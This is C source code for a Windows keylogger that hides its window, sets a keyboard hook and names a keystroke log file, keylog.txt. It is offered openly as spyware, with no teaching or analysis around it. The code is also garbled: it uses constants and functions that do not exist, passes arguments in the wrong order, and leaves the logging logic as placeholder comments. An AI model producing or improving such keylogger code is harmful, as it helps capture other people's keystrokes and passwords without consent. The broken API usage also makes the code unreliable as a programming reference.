```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

#define MAX_KEYSTROKE 1024
#define LOG_FILE "keylog.txt"

// Window class for the hook
static DWORD dw_HOOK_ID;
static HWND hwnd;

// Buffer to store keystrokes
static char s_keystroke[256];

// Callback function for keyboard messages
void KeyStrokeCallback(int bKeyDown, int wVehicle, int dwParam)
{
    if (!bKeyDown)
    {
        // Key released
        if (wVehicle == VK_KEYTAB)
        {
            s_keystroke[strlen(s_keystroke)] = '\0';
            // Write to file or save to buffer
            // Implement file writing logic here
            return;
        }
        else if (wVehicle == VK_RETURN)
        {
            s_keystroke[strlen(s_keystroke)] = '\n';
            // Implement file writing logic here
            return;
        }
        // Handle other keys as needed
    }
    else
    {
        // Key pressed
        s_keystroke[0] = (char)dwParam;
        // Implement file writing logic here
    }
}

// Window procedure
static void WndProc(HWND hwnd, int uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_KEYDOWN || uMsg == WM_KEYUP)
    {
        KeyStrokeCallback(uMsg == WM_KEYDOWN, (int)wParam, lParam);
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main()
{
    // Create window
    HWND hwnd = CreateWindowEx(0, "KeyLogger", WS_MINIMIZE | WS_HIDE, 0, 0, 0, 0, 0, HWND_DESKTOP, NULL, NULL);
    if (!hwnd)
    {
        printf("Failed to create window\n");
        return 1;
    }

    // Register window class for hook
    WNDCLASS wndClass;
    wndClass.lpfnWndProc = WndProc;
    wndClass.hInstance = GetWindowModuleHandle(NULL);
    if (!RegisterClassEx(&wndClass))
    {
        printf("Failed to register window class\n");
        return 2;
    }

    // Set window hook
    dw_HOOK_ID = SetWindowsHookEx(hwnd, WH_KEYBOARD, KeyStrokeCallback, 0);
    if (!dw_HOOK_ID)
    {
        printf("Failed to set keyboard hook\n");
        return 3;
    }

    // Start processing messages
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Stop hook
    UnhookWindowsHook(dw_HOOK_ID);
    DestroyWindow(hwnd);
    UnregisterClassEx(wndClass);

    return 0;
}
